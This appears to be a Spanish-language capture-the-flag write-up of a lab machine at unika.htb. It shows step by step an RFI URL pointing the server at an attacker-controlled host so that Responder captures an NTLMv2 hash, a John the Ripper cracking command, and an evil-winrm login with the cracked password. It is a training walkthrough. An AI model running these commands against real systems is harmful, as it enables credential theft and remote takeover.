--------
- Tags:  #WinRM #CustomApplications #protocols #XAMPP #SMB #Responder #php #Reconnaisance #passwordcracking #hashcapture #remotefileinclusion #remotecodeexecution
--------------

![](../img/0ed68a185d7ddd1e9f8592bd9a8b73ac.png)

![](../img/729f23bb63aab237c61ec0b3a0f13ed2.png)

### 🔍 Reconocimiento inicial

Se nos solicita acceder al servicio web asociado a la IP, pero al acceder a `http://unika.htb` obtenemos un error de "servidor no encontrado". Esto indica que la resolución DNS no está funcionando para ese nombre.


![](../img/1da0fd448c579252379d4ec84713e0d8.png)

📌 **Solución**: Agregar la IP y el nombre `unika.htb` en el archivo `/etc/hosts`:

![](../img/180a75ff9c164ea5b79c2f3d264dfd7f.png)

Al recargar la página en el navegador, se muestra la web correctamente.

![](../img/6b18bad4e7716145c0f1e302d46d3bcb.png)

### 🌐 Navegación web

Accediendo a `http://unika.htb`, vemos una web de diseño. Al inspeccionar los enlaces, detectamos que en la URL aparece el parámetro `?page=`. Por ejemplo:

```bash
http://unika.htb/index.php?page=german.html
```

📌 Esto indica que el lenguaje de backend es **PHP**, y el parámetro **`page`** podría ser vulnerable a LFI o RFI.

![](../img/262a78cee887d87e811eb58d07fc5c4b.png)

![](../img/f1d81e1566bcb44aba5ccbf56a41cc23.png)


Nos preguntan cual es la utilidad especial para ver las interfaces en el paquete "Responder":

![](../img/7c57b9e15595f041670eb0bf18a0bef2.png)

### 🧰 Responder y captura de hashes

Se nos pide usar **Responder** para capturar hashes de autenticación.  

Responder se ejecuta con la interfaz de red especificada:

```bash
responder -I (interfaz)
```

![](../img/6fae8f30742d2dcb63d3472f246c4693.png)

📌 Verificamos que están activos servicios como SMB, HTTP, DNS, FTP, entre otros.

### 🧩 LFI + RFI para capturar el hash NTLM

Modificamos la URL del parámetro `page` para que acceda a un recurso remoto en nuestra máquina (con Responder activo):

```bash
http://unika.htb/index.php?page=//tu_IP/somefile
```

![](../img/bd0c88fd3625135aeeb6a19e5f438611.png)

Esto fuerza al servidor a intentar autenticarse, permitiendo que **Responder capture el hash NTLMv2** del usuario `Administrator`.


En donde también nos preguntan qué significa **NTLM**:
Se trata del sistema de autenticación utilizado por Windows. 

![](../img/6733c3eec5e6e7359638c34f909923aa.png)

Llegando al final de la máquina, nos preguntan sobre el programa de crackear contraseñas "John the Ripper"

![](../img/cca1768554397881e0da856dc520f130.png)

Usamos John para probar millones de contraseñas contra el hash capturado desde Responder, y así descubrir la contraseña real.

Bien. Con responder:

![](../img/703034a53fd63c732a2d8c690b7c1a23.png)

![](../img/6e95c959e63fb4fec94c3b352a1f804e.png)

En Responder IP. Cogeremos esa IP y la pondremos en el navegador /somefile tal que así:

![](../img/d2f0561183e5d8bd91d059bdc8cc8b35.png)

Y veremos que se nos ha creado un hash en el Responder:

![](../img/9afc88c601b0bb41e977486e44aceb57.png)

Este codigo / hash (desde Administrator, absolutamente todo) , lo copiaremos, y creamos un documento "hash.txt"

![](../img/5aa8766b184358a8e974cadf233ef7ff.png)

Esta contraseña es la que nos devuelve John tras crackear el hash con el siguiente comando:

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![](../img/e19df0765f8239dcf5f6b690f838b6e8.png)

Resultado:

![](../img/604c9a959985335be6f746e2f1afe280.png)


## 🖥️ Conexión remota con Evil-WinRM

Una vez tenemos la contraseña, nos conectamos con `evil-winrm`:

```bash
sudo evil-winrm -u Administrator -p badminton -i 10.129.95.234
```

![](../img/b99a73e28d9263bb4e41a489b662cf96.png)

Accedemos a una shell remota del sistema Windows objetivo.

*Añadimos el perfil / usuario "-u" con la contraseña "-p" y la "-i" IP

![](../img/101187cbdf7651655306ce9a19fd34bf.png)

- `evil-winrm` utiliza por defecto el puerto **TCP 5985**, correspondiente a **WinRM sobre HTTP**.
    
- Si fuese conexión segura (**HTTPS**), usaría el puerto **5986**, pero no se indica ningún protocolo especial, así que asumimos el puerto **estándar (5985)**.

## 📁 Exploración del sistema y obtención de la flag

Una vez dentro, navegamos por los directorios hasta encontrar la flag del usuario `mike`.

![](../img/7c7ccdf54938a2857f382da28f857db1.png)

Y finalmente:

![](../img/ff5efba62bf6a24c3996cd3af3e2b2b2.png)

Hasta encontrar nuestra querida flag !! =D

## ✅ Conclusión final

- Se detecta un sitio web en `unika.htb` vulnerable a **Remote File Inclusion (RFI)** a través del parámetro `?page=`.
    
- Aprovechando esta vulnerabilidad, se fuerza al servidor a conectarse a un recurso remoto falso utilizando **Responder**, capturando un **hash NTLMv2** del usuario `Administrator`.
    
- El hash NTLMv2 se **crackea exitosamente con John The Ripper**, revelando la contraseña `badminton`.
    
- Con estas credenciales, se realiza una conexión remota vía **evil-winrm**, accediendo como **Administrator**.
    
- Finalmente, se navega por el sistema de archivos hasta localizar y leer el archivo `flag.txt`.
    

---

🧠 **Lección aprendida:**  
Este laboratorio demuestra cómo una vulnerabilidad web mal gestionada (como RFI) puede escalar rápidamente hasta comprometer por completo un sistema Windows. La combinación de errores de desarrollo y servicios internos expuestos permite a un atacante capturar credenciales, descifrarlas y obtener acceso total. Es crucial validar los parámetros en las URLs y evitar incluir archivos remotos sin controles estrictos.



